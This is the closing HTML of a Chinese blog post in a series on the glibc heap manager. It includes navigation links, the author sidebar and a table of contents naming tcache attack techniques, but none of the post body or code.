<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2021/08/07/glibc-8/">← Next 关于如何理解Glibc堆管理器(Ⅷ——从源代码理解malloc)</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2021/08/07/glibc-6/">关于如何理解Glibc堆管理器(Ⅵ——从House of Orange理解Heap是如何被拓展的) Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/6.png" alt="Logo"></a><h1 id="Dr"><a href="TokameinE">TokameinE</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/ErodedElk"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://space.bilibili.com/1782544616"><i class="fa-brands fa-bilibili" alt="BiliBili"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Tcache-%E7%BB%93%E6%9E%84%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">Tcache 结构：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">代码调试：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache-poisoning%EF%BC%9A-%E5%88%A0%E9%99%A4%E4%BA%86%E5%A4%A7%E5%A4%9A%E6%95%B0%E8%AF%B4%E6%98%8E"><span class="toc-number">2.1.</span> <span class="toc-text">tcache_poisoning：(删除了大多数说明)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache-house-of-spirit%EF%BC%9A"><span class="toc-number">2.2.</span> <span class="toc-text">tcache house of spirit：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache-stashing-unlink-attack%EF%BC%9A-%E6%9C%89%E7%A8%8D%E5%BE%AE%E6%94%B9%E5%8A%A8"><span class="toc-number">2.3.</span> <span class="toc-text">tcache_stashing_unlink_attack：(有稍微改动)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">2.4.</span> <span class="toc-text">总结：</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>